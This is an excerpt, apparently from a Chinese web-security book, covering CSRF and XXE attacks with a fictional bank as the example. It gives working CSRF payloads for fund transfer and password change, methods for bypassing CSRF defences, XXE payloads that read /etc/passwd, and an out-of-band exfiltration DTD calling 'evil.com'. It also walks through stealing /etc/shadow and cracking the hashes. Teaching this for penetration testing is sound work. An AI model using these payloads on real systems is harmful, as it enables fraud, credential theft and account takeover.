与其他常见漏洞原型不同，XSS 可以从多个角度进行利用——其中一些跨会话持久存在（存储型），而另一些则不持久存在（反射型）。此外，由于 XSS 漏洞依赖于在客户端中寻找脚本执行接收器，浏览器复杂规范中的 Bug 也有可能导致意外的脚本执行（基于 DOM 的 XSS）。存储型 XSS 可以通过分析数据库存储来发现，这使其易于检测。但反射型和基于 DOM 的 XSS 漏洞通常难以发现和准确定位——这意味着这些漏洞极有可能存在于大量的 Web 应用程序中，但尚未被检测到。

XSS 是一种伴随了 Web 大部分历史的攻击类型。虽然攻击的基础仍然相同，但攻击的表面积和变体都有所增加。

由于其广泛的表面积、（相对）易于执行、规避检测以及此类漏洞所拥有的威力，XSS 攻击应该是任何渗透测试人员或漏洞赏金猎人核心技能组合的重要组成部分。

---

## 第11章 跨站请求伪造

有时我们已经知道存在一个能够允许我们执行期望操作的 API 端点，但我们无法访问该端点，因为它需要特权访问（例如，管理员账户）。在本章中，我们将构建跨站请求伪造（Cross-Site Request Forgery，CSRF）漏洞利用，从而使管理员或特权账户代表我们执行操作，而不是使用 JavaScript 代码片段。

CSRF 攻击利用了浏览器的运行方式以及网站与浏览器之间的信任关系。通过发现依赖这种关系来确保安全——但对浏览器给予了太多信任——的 API 调用，我们可以构建链接和表单，稍加努力就可以使终端用户在不知情的情况下，代表其自身发起请求。

通常，遭受攻击的用户不会注意到 CSRF 攻击，因为浏览器中的请求是在后台发生的。这意味着这种攻击类型可用于利用特权用户，并在用户完全不知情的情况下针对服务器执行操作。它是最隐蔽的攻击之一，自 21 世纪初诞生以来已在整个 Web 上造成了巨大的破坏。

### 查询参数篡改

让我们考虑最基本形式的 CSRF 攻击——通过超链接进行参数篡改。Web 上的大多数超链接形式都对应于 HTTP GET 请求。最常见的超链接只是嵌入在 HTML 片段中的 `<a href="https://my-site.com"></a>`。

HTTP GET 请求的结构简单且一致，无论它是从哪里发送、从哪里读取，还是它如何在网络上传输。为了使 HTTP GET 有效，它必须遵循受支持的 HTTP 规范版本——因此我们可以放心，GET 请求的结构在各种应用程序中都是相同的。

HTTP GET 请求的结构如下：

```http
GET /resource-url?key=value HTTP/1.1
Host: www.mega-bank.com
```

每个 HTTP GET 请求都包含 HTTP 方法（`GET`），后跟资源 URL，然后是可选的查询参数集。查询参数的开始由 `?` 表示，并一直持续到发现空格。在此之后是 HTTP 规范，下一行是资源 URL 所在的主机。

当 Web 服务器收到此请求时，它将被路由到相应的处理程序类，该类将接收查询参数以及一些额外的信息，以识别发起请求的用户、他们请求的浏览器类型以及他们期望返回的数据格式。

让我们看一个例子，以便使这个概念更加具体。第一个例子是构建在 ExpressJS（最流行的基于 Node.js 的 Web 服务器软件）之上的服务器端路由类：

```javascript
/*
 * An example route.
 *
 * Returns the query provided by the HTTP request back to the requester.
 * Returns an error if a query is not provided.
 */
app.get('/account', function(req, res) {
 if (!req.query) { return res.sendStatus(400); }
 return res.json(req.query);
});
```

这是一个极其简单的路由，它只做几件事：

*   仅接受针对 `/account` 的 HTTP GET 请求
*   如果未提供查询参数，则返回 HTTP 400 错误
*   如果提供了查询参数，则以 JSON 格式将查询参数反射回发送方

让我们从 Web 浏览器向该端点发起请求：

```javascript
/*
 * Generate a new HTTP GET request with no query attached.
 *
 * This will fail and an error will be returned.
 */
const xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
 console.log(xhr.responseText);
}
xhr.open('GET', 'https://www.mega-bank.com/account', true);
xhr.send();
```

在这里，我们从浏览器向服务器发起一个 HTTP GET 请求，服务器将返回 400 错误，因为我们没有提供任何查询参数。我们可以添加查询参数以获得更有趣的结果：

```javascript
/*
 * Generate a new HTTP GET request with a query attached.
 *
 * This will succeed and the query will be reflected in the response.
 */
const xhr = new XMLHttpRequest();
const params = 'id=12345';
xhr.onreadystatechange = function() {
 console.log(xhr.responseText);
}
xhr.open('GET', `https://www.mega-bank.com/account?${params}`, true);
xhr.send();
```

做出此请求后不久，将返回一个包含以下内容的响应：

```json
{
 "id": 12345
}
```

如果你查看浏览器中的网络请求，它还将包含一个 HTTP 200 状态码。

必须理解这些请求的流程，以便发现和利用 CSRF 漏洞。让我们稍微退回去，再次讨论一下 CSRF。

CSRF 攻击的两个主要标识是：

*   权限提升
*   发起请求的用户账户通常不知道请求已发生（这是一种隐蔽的攻击）

大多数遵循 HTTP 规范的创建、读取、更新和删除（CRUD）Web 应用程序会使用许多 HTTP 动词，而 GET 只是其中之一。不幸的是，GET 请求是所有请求中最不安全的，也是构建 CSRF 攻击最简单的方式之一。

我们分析的最后一个 GET 端点反射了数据，但重要的一点是，它确实读取了我们发送给它的查询参数。你浏览器中的 URL 栏会发起 HTTP GET 请求，浏览器中或手机中的 `<a></a>` 链接也是如此。

此外，当我们在互联网上点击链接时，我们很少会评估源以查看链接将带我们去哪里。这个链接：

```html
<a href="https://www.my-website.com?id=123">My Website</a>
```

在浏览器中会直接显示为 "My Website"。大多数用户不会知道链接中附加了一个参数作为标识符。任何点击该链接的用户都将从其浏览器发起一个请求，该请求将向关联的服务器发送一个查询参数。

让我们想象一下我们的虚拟银行网站 MegaBank 使用了带有参数的 GET 请求。看看这个服务器端路由：

```javascript
import session from '../authentication/session';
import transferFunds from '../banking/transfers';

/*
 * Transfers funds from the authenticated user's bank account
 * to a bank account chosen by the authenticated user.
 *
 * The authenticated user may choose the amount to be transferred.
 */
app.get('/transfer', function(req, res) {
 if (!session.isAuthenticated) { return res.sendStatus(401); }
 if (!req.query.to_user) { return res.sendStatus(400); }
 if (!req.query.amount) { return res.sendStatus(400); }
 transferFunds(session.currentUser, req.query.to_user, req.query.amount,
 (error) => {
 if (error) { return res.sendStatus(400); }
 return res.json({
 operation: 'transfer',
 amount: req.query.amount,
 from: session.currentUser,
 to: req.query.to_user,
 status: 'complete'
 });
 });
});
```

对于没有经验的人来说，这个路由看起来相当简单。它检查用户是否拥有正确的权限，并检查是否已为转账指定了另一个用户。因为用户拥有正确的权限，考虑到用户必须通过身份验证才能发起此请求，指定的金额应该是准确的（它假设请求是代表发起请求的用户做出的）。同样地，我们假设转账是转给正确的人。不幸的是，因为这是使用 HTTP GET 请求做出的，所以可以很容易地构建一个指向该特定路由的超链接并将其发送给已认证的用户。

涉及 HTTP GET 参数篡改的 CSRF 攻击通常按以下步骤进行：

1.  黑客发现 Web 服务器使用 HTTP GET 参数来修改其逻辑流（在这种情况下，确定银行转账的金额和目标）。
2.  黑客使用这些参数构建一个 URL 字符串：`<a href="https://www.mega-bank.com/transfer?to_user=<hacker’s account>&amount=10000">click me</a>`。
3.  黑客制定分发策略：通常是针对性的（谁最有可能处于登录状态并且拥有正确金额的资金？）或者是群发的（如何在短时间内在被检测到之前影响尽可能多的人？）。

通常这些攻击是通过电子邮件或社交媒体分发的。由于易于分发，其对公司的影响可能是毁灭性的。黑客甚至利用网页广告攻势将他们的链接植入尽可能多的人手中。

### 替代的 GET Payload

因为浏览器中的默认 HTTP 请求是 GET 请求，所以许多接受 URL 参数的 HTML 标签在与之交互或加载到 DOM 中时，会自动发起 GET 请求。因此，GET 请求最容易受到 CSRF 攻击。

在先前的例子中，我们使用了一个超链接 `<a></a>` 标签来诱骗用户在他们自己的浏览器中执行 GET 请求。或者，我们可以构建一个图像来做同样的事情：

```html
<!--Unlike a link, an image performs an HTTP GET request right when it loads
 into the DOM. This means it requires no interaction from the user loading
 the web page.-->
<img src="https://www.mega-bank.com/transfer?to_user=<hacker's account>&amount=10000" width="0" height="0" border="0">
```

当在浏览器中检测到图像标签时，浏览器将向 `<img>` 标签中包含的 `src` 端点发起 GET 请求（见图 11-2）。这就是图像对象加载到浏览器中的方式。因此，一个图像标签（在这种情况下，是一个不可见的 0 × 0 像素图像）可用于在不需要任何用户交互的情况下发起 CSRF。

```
[User #1 posts an <img> that links to an HTTP GET endpoint.]
                               |
                               v
[User #2 loads the image.]
                               |
                               v
[An HTTP GET request is made on behalf of User #2.]
                               |
                               v
[The server processes the HTTP GET with User #2's auth cookie.]
                               |
                               v
[Server state is changed as if it were changed by User #2 although User #2 is not aware of what happened.]
```

*图 11-2. CSRF 图像——在目标应用程序内部，发布一个 <img> 标签，在加载时强制发起 HTTP GET 请求*

同样地，大多数其他允许 URL 参数的 HTML 标签也可以用来发起恶意的 GET 请求。考虑 HTML5 `<video></video>` 标签：

```html
<!-- Videos typically load into the DOM immediately, depending on the browser's
 configuration. Some mobile browsers will not load until the element is interacted
 with. -->
<video width="1280" height="720" controls>
 <source src="https://www.mega-bank.com/transfer?to_user=<hacker's account>&amount=10000" type="video/mp4">
</video>
```

上述视频的功能与所使用的图像标签完全相同。因此，必须留意任何通过 `src` 属性从服务器请求数据的标签类型。其中大多数都可用于针对毫无防备的终端用户发起 CSRF 攻击。

### 针对 POST 端点的 CSRF

CSRF 攻击通常针对 GET 端点发生，因为通过超链接、图像或其他自动发起 HTTP GET 请求的 HTML 标签来传播 CSRF 要容易得多。然而，传送针对 POST、PUT 或 DELETE 端点的 CSRF Payload 仍然是可能的。传送 POST Payload 只需要多做一点工作，并且需要一些强制性的用户交互（见图 11-3）。

通常，由 POST 请求传送的 CSRF 攻击是通过浏览器表单创建的，因为 `<form></form>` 对象是少数不需要任何脚本即可发起 POST 请求的 HTML 对象之一：

```html
<form action="https://www.mega-bank.com/transfer" method="POST">
 <input type="hidden" name="to_user" value="hacker">
 <input type="hidden" name="amount" value="10000">
 <input type="submit" value="Submit">
</form>
```

在通过 POST 表单进行 CSRF 的情况下，我们可以利用表单输入上的 "hidden" 类型属性，以便播种不会在浏览器内部渲染的数据。

除了设计 CSRF Payload 所需的隐藏字段外，我们还可以通过提供合法的表单字段来进一步操纵用户：

```html
<form action="https://www.mega-bank.com/transfer" method="POST">
 <input type="hidden" name="to_user" value="hacker">
 <input type="hidden" name="amount" value="10000">
 <input type="text" name="username" value="username">
 <input type="password" name="password" value="password">
 <input type="submit" value="Submit">
</form>
```

在这个例子中，用户将看到一个登录表单——也许是针对一个合法的网站。但当表单被填写时，实际上将向 MegaBank 发起请求——不会对任何内容发起登录尝试。

这是一个关于如何使用看起来合法的 HTML 组件来发送请求，从而利用用户浏览器中当前应用程序状态的例子。在这种情况下，用户已登录到 MegaBank，尽管他们正在与一个完全不同的网站进行交互，但我们能够利用他们在 MegaBank 中的当前会话来代表他们执行提升权限的操作。

这种技术也可用于代表有权访问内部网络的用户发起请求。表单的创建者无法向内部网络上的服务器发起请求，但如果处于内部网络中的用户填写并提交了表单，由于目标用户拥有的提升的网络访问权限，请求将针对内部服务器发起。

自然地，这种类型的 CSRF（POST）比通过 `<a></a>` 标签播种 CSRF GET 请求更为复杂——但有时你必须针对 POST 端点发起提升权限的请求，在这种情况下，表单是成功发起攻击最简单的方式。

### 绕过 CSRF 防御

根据你所针对的应用程序，反 CSRF 防御可能很容易被攻击者绕过。

> 请记住，来自浏览器的任何请求都可以被伪造。像 Burp、Zap 甚至 curl 这样的工具都可以用来发送带有伪造的标头（Header）、内容类型（Content Type）或主体的请求。

并非所有的验证器都可以使用相同的技术来绕过。因此，尝试多种选择并记录测试过程，以更深入地了解应用程序的验证工作流，是非常重要的。

#### 标头验证

依赖于验证 `referrer` 或 `origin` 等标头的 CSRF 防御，可能可以通过消除这些标头来绕过，导致服务器在验证步骤中读取到 null 或未定义。在某些情况下，这可以通过向 `<a>` 和 `<form>` 标签添加 `rel=noreferrer` 来实现。在可以将 `rel=noreferrer` 添加到这些标签之一的情况下，浏览器将自动省略 referrer 标头。示例如下：

```html
<a href="https://example.com/update_password?password=123" rel="noreferrer">click me to update password</a>
```

随着你继续阅读本书，你会注意到我不主张将标头作为第一线安全措施。HTTP 标头极易被伪造、绕过或修改，考虑到它们在实施安全机制时被使用的频率，这令人感到惊讶。

#### 令牌池

一些遗留的 CSRF 防御工具是在“池”（Pool）内评估令牌（Token），而不是进行逐案分析。在这些系统中，可以从你自己的用户账户中生成一个合法的 CSRF 令牌，并将其作为 CSRF 攻击的一部分附加，从而成功验证请求。

合法的令牌通常可以直接从浏览器开发者工具中获取，方法是在你自己的测试账户上分析从 Web 应用程序发起的特定 HTTP 请求。稍后，令牌可以通过多种方式附加到请求中，例如通过 Linux 或 macOS 终端中的 curl 请求：

```bash
curl https://website.com/auth \
 -H "anti-csrf-token": "12345abc"
```

一些服务器将尝试拒绝与合法请求结构不够相似的请求。因此，可能需要付出一些努力来模拟有效请求的结构和数据。

#### 弱令牌

以可预测方式生成的 CSRF 令牌（例如使用日期、时间、用户名或递增的整数值）可以被模拟和伪造。在评估使用抗 CSRF 令牌的应用程序的弱点时，仔细查看所生成的 CSRF 令牌的结构。

例如，考虑以下弱 CSRF 令牌：`1691434927`，`1691434928`。经过进一步评估，你可以确定这些 CSRF 令牌实际上是 Unix 时间戳（它们代表自 1970 年 1 月 1 日 00:00:00 UTC 以来经历的毫秒数）。通过理解这些令牌生成的机制，你可以开始伪造类似的令牌，这些令牌将被生成它们的服务器端验证器接受。在这个特定的例子中，在 2023 年 8 月 7 日晚上 8:04:36 通过网络发送的 CSRF Payload，使用包含内容 `1691438676` 的伪造 CSRF 令牌将成功通过验证。

#### 内容类型

如果服务器期望特定的内容类型，例如 `application/json`，如果你发送带有 `application/x-url-encoded` 或 `form-multipart` 的 Payload，它的行为可能会有所不同。这些替代的内容类型可能会跳过验证步骤，并允许你的 CSRF 攻击成功。

在极少数情况下，以下内容类型可能会绕过验证：

*   `application/x-7z-compressed`
*   `application/zip`
*   `application/xml`
*   `application/xhtml+xml`
*   `application/rtf`
*   `application/pdf`
*   `application/ld+json`
*   `application/gzip`
*   `text/csv`
*   `text/css`

内容类型在所有请求上都被声明为 HTTP 标头：

```http
Content-Type: text/html; charset=utf-8
Content-Type: multipart/form-data;
```

HTTP 表单将内容类型作为属性 `enctype` 包含：

```html
<form action="/" method="post" enctype="multipart/form-data">
 <button type="submit">Submit</button>
</form>
```

在 HTTP 表单情况下，只需打开浏览器开发者工具并编辑 `enctype` 字段，就会强制浏览器在表单提交时修改它随其 HTTP 请求发送的内容类型。

#### 正则表达式过滤器绕过

如果服务器验证使用正则表达式来检测 CSRF Payload，编写 URL 的替代方法可能会绕过上述正则表达式。一些示例如下：

*   在定义从哪里开始读取查询参数时，一些服务器除了问号（`?`）外还接受分号（`;`）。例如，查询 `https://example.com?test=123` 可以写为 `https://example.com;test=123`。
*   在定义文件位置时，一些服务器将接受正斜杠或反斜杠，例如 `https://example.com/test` 或 `https://example.com\test`。
*   配置不当的服务器将接受相对路径符号（`..`）。例如，`https://example.com/../test`。

要确定服务器用于验证的特定正则表达式可能会很困难，因此在遇到疑问时，首先尝试针对在搜索引擎上找到的最常见的验证器正则表达式进行绕过。许多开发人员不会设计他们自己的正则表达式。

#### Iframe Payload

与其使用图像、脚本或链接，不如通过 iframe `src` 属性来产生 CSRF，该属性会自动加载且不需要用户交互。执行此操作的方法很简单，如下所示：

```html
<iframe src="https://example.com/change_password?password=123"></iframe>
```

当加载到 DOM 中时，iframe 将立即向 `src` 属性中的值发起 HTTP 请求。请注意，iframe CSRF 仅适用于 HTTP GET 端点。

#### AJAX Payload

在可以执行脚本的情况下，能够作为 CSRF Payload 运行的异步 JavaScript 和 XML（Asynchronous JavaScript and XML，AJAX）请求可以从 JavaScript 执行上下文中发起。这看起来如下所示：

```javascript
const url = "https://example.com/change_password?password=123";
const xhr = new XMLHTTPRequest();
xhr.open("GET", url);
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.send();
```

这通常在允许用户自定义的网站上发现。否则，在网站上不存在 XSS 漏洞的情况下，很少能发现它。

#### 零交互表单

如果可以执行脚本，则可以在不需要用户交互的表单内执行 CSRF。相反，JavaScript Payload（通常通过 XSS 获取）将通过 DOM API 模拟用户与表单的交互：

```html
<form id="pw_form" method="GET" action="https://example.com/change_password">
<input id="pw" type="hidden" name="password" value="" />
<input type="submit" value="submit"/>
</form>

<script>
 // obtain references to the form
 const el = document.querySelector("#el")
 const pw = document.querySelector("#pw")

 // change the password field
 pw.val = "new_password_123"

 // submit the form
 el.submit()
</script>
```

在很大程度上，在可以执行 JavaScript 脚本的情况下，所有的 DOM 交互都可以通过 JavaScript API 调用来触发。

### 总结

CSRF 攻击利用了 Web 浏览器、用户和 Web 服务器/API 之间存在的信任关系。默认情况下，浏览器信任从用户设备发起的行为是代表该用户的。

在 CSRF 的情况下，这部分正确，因为用户触发了该行为，但不理解该行为在后台所做的事情。当用户点击链接时，浏览器会代表他们发起 HTTP GET 请求——无论该链接来自何处。因为链接是受信任的，所以宝贵的身份验证数据可以随 GET 请求一起发送。

从本质上讲，CSRF 攻击之所以能够奏效，是浏览器标准委员会（如 WHATWG）制定的信任模型的结果。这些标准将来有可能会发生改变，从而使 CSRF 风格的攻击更难实施。但就目前而言，这些攻击将会长期存在。它们在 Web 上很常见，且极易被利用。

## 第12章 XML 外部实体

XML 外部实体（XML External Entity，XXE）是一种通常非常容易实施但破坏力极大的攻击分类。这类攻击主要依赖于应用程序代码中配置不当的 XML 解析器。

一般来说，几乎所有的 XXE 攻击漏洞都是由于接受 XML（或类似 XML）有效载荷（Payload）的应用程序接口（Application Programming Interface，API）端点造成的。你可能会认为接受 XML 的 HTTP 端点并不常见，但实际上，类似 XML 的格式包括 SVG、HTML/DOM、PDF (XFDF) 和 RTF。这些类似 XML 的格式与 XML 规范有许多共同点，因此，许多 XML 解析器也接受它们作为输入。

XXE 攻击背后的神奇之处在于，XML 规范包含一个用于导入外部文件的特殊注释。这个特殊的指令被称为外部实体（External Entity），它会在评估 XML 文件的机器上进行解析。这意味着，发送到服务器 XML 解析器的精心构建的 XML Payload 可能会导致服务器文件系统中的文件遭到泄露。XXE 通常用于窃取其他用户的文件，或访问诸如 `/etc/shadow` 之类的文件，这些文件存储了基于 Unix 的服务器正常运行所需的重要凭证。

### XXE 基础

XXE 攻击的核心是 XML 规范，以及它在处理被称为实体（Entity）时的弱点。XML 实体是用于在 XML 文件内或 XML 规范内引用另一段数据的字符集。你可能已经见过像 `&amp;` 或 `&lt;` 这样的 XML 实体，它们分别引用和号（`&`）和小于号（`<`）。这些被称为预定义实体（Predefined Entities），因为它们总是引用相同的 ASCII 字符。

在 XML 文档中可以引用的更具危险性的实体形式是自定义实体（Custom Entities）。这些实体可以引用由程序员定义的大量数据，包括当前 XML 文档之外的数据。

最具风险的自定义实体形式当然是外部实体引用（External Entity Reference），它是 XXE 风格攻击的核心。通过在 XML 文档类型定义（Document Type Definition，DTD）中引用外部实体，可以在解析前将外部文件拉入 XML 文件中。考虑以下示例：

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]>
```

此示例实体引用了文件 `/etc/passwd`，其中包含关于 Linux 系统用户账户的敏感信息。XXE 攻击利用这些外部引用来泄露敏感信息、修改预期的应用程序功能，有时甚至可以实现远程代码执行（Remote Code Execution，RCE）。

### 直接 XXE

在直接 XXE（Direct XXE）中，带有外部实体标志的 XML 对象被发送到服务器。接着该对象被解析，并向用户返回一个包含外部实体内容的结果。

想象一下，mega-bank.com 有一个屏幕截图工具，允许你将银行门户的屏幕截图直接发送给客户支持。在客户端，这看起来像这样：

```html
<!--
 A simple button. Calls the function `screenshot()` when clicked.
 -->
<button class="button"
 id="screenshot-button"
 onclick="screenshot()">
 Send Screenshot to Support</button>
```

```javascript
/*
 * Collect HTML DOM from the `content` element and invoke an XML
 * parser to convert the DOM text to XML.
 *
 * Send the XML over HTTP to a function that will generate a screenshot
 * from the provided XML.
 *
 * Send the screenshot to support staff for further analysis.
 */
const screenshot = function() {
 try {
 /*
 * Attempt to convert the `content` element to XML.
 * Catch if this process fails—generally this should succeed
 * because HTML is a subset of XML.
 */
 const div = document.getElementById('content').innerHTML;
 const serializer = new XMLSerializer();
 const dom = serializer.serializeToString(div);
 /*
 * Once the DOM has been converted to XML, generate a request to
 * an endpoint that will convert the XML to an image. Hence
 * resulting in a screenshot.
 */
 const xhr = new XMLHttpRequest();
 const url = 'https://util.mega-bank.com/screenshot';
 const data = new FormData();
 data.append('dom', dom);
 /*
 * If the conversion of XML -> image is successful,
 * send the screenshot to support for analysis.
 *
 * Else alert the user the process failed.
 */
 xhr.onreadystatechange = function() {
 sendScreenshotToSupport(xhr.responseText, (err) => {
 if (err) { alert('could not send screenshot.') }
 else { alert('screenshot sent to support!'); }
 });
 }
 xhr.send(data);
 } catch (e) {
 /*
 * Warn the user if their browser is not compatible with this feature.
 */
 alert(Your browser does not support this functionality. Consider upgrading.
 );
 }
};
```

该功能的使用场景很简单：用户点击一个按钮，将他们遇到问题的屏幕截图发送给支持人员。其编程实现也并不复杂：

1.  浏览器将当前用户的视图（通过 DOM）转换为 XML。
2.  浏览器将此 XML 发送到一个将其转换为 JPG 的服务。
3.  浏览器通过另一个 API 将该 JPG 发送给 MegaBank 的支持人员。

当然，这段代码存在不止一个问题。例如，我们可以自己使用我们自己的图像去调用 `sendScreenshotToSupport()` 函数。验证图像内容是否合法要比验证 XML 困难得多，而且尽管将 XML 转换为图像很容易，但图像转换为 XML 却很困难，因为你会丢失上下文（div 名称、ID 等）。

在服务器上，一个名为 `screenshot` 的路由与我们从浏览器发起的请求相对应：

```javascript
import xmltojpg from './xmltojpg';
/*
 * Convert an XML object to a JPG image.
 *
 * Return the image data to the requester.
 */
app.post('/screenshot', function(req, res) {
if (!req.body.dom) { return res.sendStatus(400); }
xmltojpg.convert(req.body.dom)
.then((err, jpg) => {
 if (err) { return res.sendStatus(400); }
 return res.send(jpg);
});
});
```

为了将 XML 文件转换为 JPG 文件，它必须通过 XML 解析器。而一个合格的 XML 解析器必须遵循 XML 规范。

我们的客户端发送到服务器的 Payload 仅仅是一个转换成 XML 格式的 HTML/DOM 集合，以便于解析。在正常的使用场景下，它几乎没有可能执行任何危险的操作。

然而，由客户端发送的 DOM 绝对可以被更懂技术的用户进行修改。或者，我们可以伪造网络请求并将我们自己的自定义 Payload 发送到服务器：

```javascript
import utilAPI from './utilAPI';
/*
 * Generate a new XML HTTP request targeting the XML -> JPG utility API.
 */
const xhr = new XMLHttpRequest();
xhr.open('POST', utilAPI.url + '/screenshot');
xhr.setRequestHeader('Content-Type', 'application/xml');
/*
 * Provide a manually crafted XML string that makes use of the external
 * entity functionality in many XML parsers.
 */
const rawXMLString = `<!ENTITY xxe SYSTEM
 "file:///etc/passwd" >]><xxe>&xxe;</xxe>`;
xhr.onreadystatechange = function() {
 if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
 // check response data here
 }
}
/*
 * Send the request to the XML -> JPG utility API endpoint.
 */
xhr.send(rawXMLString);
```

当服务器接收到这个请求时，它的解析器将评估 XML，然后在外发响应中向我们返回一张图像（JPG）。如果该 XML 解析器没有显式禁用外部实体，我们应该会在返回的屏幕截图中看到 `/etc/passwd` 文件的文本内容。

### 间接 XXE

在间接 XXE（Indirect XXE）中，服务器由于某种请求而生成一个 XML 对象。该 XML 对象包含由用户提供的参数，从而可能导致插入一个外部实体标签。

有时，XXE 攻击可以针对一个不直接对用户提交的 XML 对象进行操作的端点。当我们遇到一个以类似 XML 的对象作为参数的 API 时，我们自然应该首先考虑尝试通过 XXE 攻击 Payload 来引用外部实体。然而，仅仅因为一个 API 在其 Payload 中不接受 XML 对象，并不意味着它没有使用 XML 解析器。

考虑以下使用场景：开发人员正在编写一个应用程序，该应用程序仅通过一个 REST API 端点向用户请求一个参数。该应用程序旨在将此参数与公司已在使用的一个企业级客户关系管理（Customer Relationship Management，CRM）软件套件进行同步。

提供该 CRM 的公司可能期望其 API 接收 XML Payload，这意味着虽然公开暴露的 Payload 不接受 XML，但为了使服务器能够与 CRM 软件套件进行正确通信，用户的 Payload 必须在 REST 服务器上转换成 XML 对象，然后发送给 CRM 软件。

这通常发生在幕后，这使得黑客很难推断出任何 XML 正在被使用。不幸的是，这实际上是一个非常普遍的现象。随着企业级软件（或依赖软件的）公司的成长，它们往往以零散的方式升级软件，而不是从头开始重构。这意味着，很多时候，现代的 JSON/REST API 实际上会在某一点上与 XML/SOAP API 进行交互。现代外观的软件和遗留软件系统被世界上许多公司拼凑在一起，而这些集成往往充满了极其严重的、易于利用的安全漏洞。

在前面的例子中，我们的非 XML Payload 会在发送给另一个软件系统之前在服务器上被转换为 XML。但是，在没有内部消息的情况下，我们该如何检测到这一情况的发生呢？

一种方法是对你正在测试其 Web 应用程序的公司进行背景调查，以确定他们拥有哪些大型企业授权协议。有时，这些信息甚至是公开的。

还可以查看他们托管的其他网页，看看是否有任何数据是通过不属于该公司的独立系统或 URL 呈现的。此外，许多旧的企业级软件套件（从 CRM 到财务或 HR 软件）对其能够存储的数据结构都有所限制。通过了解这些集成软件套件所期望的数据类型，如果面向公众的 API 在通过网络发送数据之前需要对数据进行异常的格式化，你也许能够推断出它们对 XML 解析器的使用。

### 带外数据泄露

即使在发现 XXE 漏洞之后，数据外泄也可能未被整合进应用程序的逻辑中。XXE 漏洞并不总是会返回数据，即使 XXE 在服务器上正确执行。

在这种情况下，最理想的是在解析过程中外泄数据，而不是随响应一起外泄。这被称为 XML 带外（Out-of-Band，OOB）数据外泄。这在文件传输协议（File Transfer Protocol，FTP）上最容易实现，但在遗留服务器上也可以通过一种名为 Gopher 的较旧网络协议来实现。

首先，作为 XXE Payload 的一部分，引入一个指向你自己服务器上 XML DTD 文件的引用：

```xml
<?xml version="1.0?>
<!DOCTYPE a [
 <!ENTITY % dtd SYSTEM "https://evil.com/data.dtd">
 %asd;
 %c;
]>
<a>&rrr;</a>
```

现在，确保你服务器上的 `data.dtd` 文件可以通过 Web 访问，且包含以下内容：

```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://evil.com/%d;'>">
```

只要你的服务器启用了 FTP，一旦目标服务器加载了其 XXE Payload，它就会请求你外部托管的 DTD。该外部托管的 DTD 将通过 FTP 逐行流式传输 `/etc/passwd` 文件的内容，并将其结果保存在你的本地日志文件中。在某些场景中，可能可以使用上面相同的技术通过其他协议（如 HTTP 或轻量级目录访问协议（Lightweight Directory Access Protocol，LDAP））来流式传输数据。

### 账户接管工作流

利用 XXE 攻击的最强大攻击模式之一是 Linux 账户接管（Account Takeover，ATO）。在发现一个 XXE 漏洞后，会发起一系列的 XXE 攻击，每次攻击针对与身份验证和授权相关的独立 Linux 操作系统核心文件。利用这些攻击的结果，有可能获得某个用户的哈希密码以及所使用的哈希算法。

在找到哈希密码和哈希算法之后，可以使用彩虹表（Rainbow Table）和其他密码破解技术（取决于哈希算法）来获取该用户的明文密码。

从这一刻起，攻击者可以使用合法的用户账户登录到 Linux 服务器，并执行该用户拥有权限执行的任何操作。

#### 获取系统用户数据

Linux ATO 模式的第一步是通过 `/etc/passwd` 文件获取系统用户数据。这可以通过任何允许返回外部实体中的数据或者能够进行带外数据外泄的 XXE 漏洞来完成。

`/etc/passwd` 文件存在于所有基于 Linux 的服务器以及 BSD、Unix 和 WSL 上。它存储了关于用户账户的信息，通常用于系统登录等功能。

`/etc/passwd` 中的每一行都包含目标服务器上一个用户账户的独立条目。这些字段由冒号（`:`）分隔，总共有七个字段。一个指向 `/etc/passwd` 的条目可能看起来像下面这样：

`dev:x:1010:2020:app_developer:/dev_user:/bin/bash`

一个条目的内容被分为七个字段（如上所示），其中包括以下信息：

1.  用户名
2.  密码存储位置（`x` 表示 `/etc/shadow`）
3.  用户 ID
4.  主要组 ID
5.  注释字段/其他信息
6.  用户的家目录（Home Directory）
7.  命令行/Shell 的路径

在此工作流中，最重要的一点数据是第二项，即密码存储位置。如果这一项是 `x`（通常也是这样），那么密码哈希将在 `/etc/shadow` 文件中。

除了 ATO 场景外，`/etc/passwd` 文件还会泄露诸如用户家目录和用户组之类的信息。这使得未来的攻击能够根据 Web 服务器的目录和权限结构来危及特定的用户数据。

#### 获取密码哈希

下一步是获取与此前在 `/etc/passwd` 中找到的用户数据相对应的哈希密码。这一步可以通过任何允许返回外部实体中的数据或者能够进行带外数据外泄的 XXE 漏洞来完成。

假设 `/etc/passwd` 已经因 XXE 而遭到泄露，且用户密码被表示为 `x`，那么 `/etc/shadow` 包含了这些用户的密码哈希，并应作为下一个攻击目标。大多数 Linux 发行版（如 Ubuntu、Debian、Fedora、Mint 和 Arch）默认都会使用此文件。

`/etc/shadow` 的每一行都对应一个用户，同样使用冒号（`:`）进行分隔。每一行包含以下数据：

1.  用户名
2.  哈希密码（通常采用 `$id:$salt:$hash` 的格式）
3.  上次修改密码的日期（以 Unix 时间戳表示）
4.  两次密码修改之间的最少天数
5.  两次密码修改之间的最多天数
6.  密码过期前的警告天数
7.  密码过期后账户被禁用的天数
8.  账户过期的日期（如果适用）

此文件中最重要的攻击目标是第二项，即包含密码哈希的项。`$id` 标记将指代在存储之前用于对密码进行哈希处理的哈希算法。以下选项是有效的：

*   `$1$` 为 MD5
*   `$2a$` 和 `$2y$` 为 Blowfish
*   `$5$` 为 SHA-256
*   `$6$` 为 SHA-512
*   `$y$` 为 yescrypt

请务必注意记录用于这些密码的哈希算法，因为这些信息在稍后评估用于破解哈希的选项时会非常重要。

#### 破解密码哈希

在通过 `/etc/shadow` 获得哈希值和哈希算法之后，就可以对其进行破解。在此过程中，明文密码将从哈希值中导出。

最简单的方法是使用 John the Ripper 或 Hashcat 等第三方工具来自动化此过程。这些工具不接受未格式化的 `/etc/shadow` 和 `/etc/passwd` 文件，因此必须使用像 `unshadow` 这样的其他工具来正确格式化这些 Linux 原始文件的内容，以便将它们作为输入提供给像 John the Ripper 这样的密码破解工具。

一个简单的流程如下：

1.  创建被窃取的 `/etc/passwd` 文件的本地副本（例如，`passwd.txt`）。
2.  创建被窃取的 `/etc/shadow` 文件的本地副本（例如，`shadow.txt`）。
3.  格式化本地副本：`unshadow passwd.txt shadow.txt > passwords.txt`。
